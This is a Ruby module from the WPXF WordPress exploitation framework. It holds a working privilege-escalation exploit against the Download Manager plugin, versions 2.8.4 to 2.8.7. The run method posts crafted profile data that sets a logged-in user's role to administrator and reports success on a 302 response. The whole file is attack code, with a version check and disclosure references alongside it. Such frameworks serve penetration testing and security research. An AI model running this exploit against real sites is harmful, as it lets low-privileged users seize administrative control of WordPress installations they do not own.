# frozen_string_literal: true

class Wpxf::Auxiliary::DownloadManagerAuthenticatedPrivilegeEscalation < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Download Manager Authenticated Privilege Escalation',
      desc: %(
        The Download Manager plugin, in versions 2.8.4 to 2.8.7,
        allows authenticated users to escalate their user role to
        that of an administrator.
      ),
      author: [
        'James Golovich', # Disclosure
        'rastating'       # WPXF module
      ],
      references: [
        ['WPVDB', '8365'],
        ['URL', 'http://www.pritect.net/blog/wordpress-download-manager-2-8-8-critical-security-vulnerabilities']
      ],
      date: 'Jan 19 2016'
    )
  end

  def check
    check_plugin_version_from_readme('download-manager', '2.8.8', '2.8.4')
  end

  def requires_authentication
    true
  end

  def run
    return false unless super

    body = {
      'wpdm_profile' => {
        'display_name' => username,
        'role' => 'administrator'
      },
      'pfile_data' => {
        'display_name' => username,
        'role' => 'administrator'
      },
      'password'        => password,
      'cpassword'       => password,
      'payment_account' => '0'
    }

    mod_result = true
    scoped_option_change('follow_http_redirection', false) do
      res = execute_post_request(
        url: full_uri,
        body: body,
        cookie: session_cookie
      )

      if res.code == 302
        emit_success "User #{username} now has full admin rights"
      else
        emit_error 'Failed to escalate privileges'
        mod_result = false
      end
    end

    mod_result
  end
end
